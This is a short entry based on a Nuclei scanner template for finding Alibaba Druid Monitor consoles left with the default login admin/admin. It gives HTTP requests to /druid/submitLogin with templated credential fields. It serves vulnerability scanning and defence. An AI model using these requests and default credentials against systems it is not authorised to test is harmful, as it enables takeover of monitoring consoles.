# Nuclei Template: Alibaba Druid Monitor Default Login
**Template ID:** druid-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`druid-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Alibaba Druid Monitor default login information (admin/admin) was discovered.

## Steps to reproduce / Exploit Payload
```http
GET /druid/submitLogin HTTP/1.1
Host: {{Hostname}}

POST /druid/submitLogin HTTP/1.1
Host: {{Hostname}}

loginUsername={{username}}&loginPassword={{password}}
```

